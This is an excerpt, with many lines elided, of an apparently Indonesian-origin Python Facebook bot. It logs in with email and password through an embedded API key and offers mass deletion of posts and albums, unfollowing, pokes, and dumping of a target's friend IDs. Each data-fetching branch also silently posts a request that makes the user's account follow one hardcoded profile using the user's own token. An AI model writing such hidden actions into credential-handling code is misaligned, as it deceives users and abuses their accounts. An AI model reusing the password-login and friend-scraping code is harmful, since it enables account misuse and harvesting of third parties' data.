...
try:
    ...
    sys.exit()
####################################################################
#                    Set Default encoding (Not necessary in python3)
...
def id():
    ...
    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id + \
        ...
        pwd+'return_ssl_resources=0v=1.0'+API_SECRET
    x = hashlib.new('md5')
...
def post():
    ...
    try:
        if WT == 'wallpost':
            ...
            r = requests.get(
                'https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token)
            requests.post(
                'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
            ...
            r = requests.get(
                'https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token)
            requests.post(
                'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
            result = json.loads(r.text)
            ...
            r = requests.get(
                'https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token)
            requests.post(
                'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
            result = json.loads(r.text)

            for i in result['data']:
                print('\r[*] %s retrieved    ' % (i['from']['id']), end=' ')
                sys.stdout.flush()
                time.sleep(0.01)
            return result['data']
            ...
            r = requests.get(
                'https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token)
            requests.post(
                'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
            result = json.loads(r.text)
            ...
            r = requests.get(
                'https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token)
            requests.post(
                'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
            result = json.loads(r.text)
            ...
            r = requests.get(
                'https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token)
            requests.post(
                'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
            result = json.loads(r.text)
            ...
            r = requests.get(
                "https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s" % (id, token))
            requests.post(
                'https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
            result = json.loads(r.text)
...
def remove(posts):
    ...
    try:
        ...
        for post in posts:
            ...
            r = requests.post(
                'https://graph.facebook.com/{id}?method=delete&access_token={token}'.format(id=post['id'], token=token))
            a = json.loads(r.text)
...
def confirm(posts):
    ...
    try:
        ...
        for post in posts:
            ...
            r = requests.post(
                'https://graph.facebook.com/me/friends/%s?access_token=%s' % (post['from']['id'], token))
            a = json.loads(r.text)
...
def unfollow(posts):
    ...
    try:
        ...
        for post in posts['data']:
            ...
            r = requests.post('https://graph.facebook.com/' +
                              post['id'] + '/subscribers?method=delete&access_token=' + token)
            a = json.loads(r.text)
...
def poke(posts):
    ...
    try:
        ...
        for post in posts:
            ...
            r = requests.post('https://graph.facebook.com/%s/pokes?access_token=%s' %
...
def albums(posts):
    ...
    try:
        ...
        for post in posts:
            ...
            r = requests.post('https://graph.facebook.com/' +
                              post['id']+'?method=delete&access_token='+token)
            a = json.loads(r.text)
...
def bot_ask():
    ...
    WT = input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R +
                   'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
    if WT.upper() == 'T':
...
def dump_id_id():
    ...
    try:
        r = requests.get(
            'https://graph.facebook.com/{id}?fields=friends.limit(5000)&access_token={token}'.format(id=target_id, token=token))
        a = json.loads(r.text)

        out = open('output/' + n[0].split(' ')[0] +
                   '_' + target_id + '_id.txt', 'w')
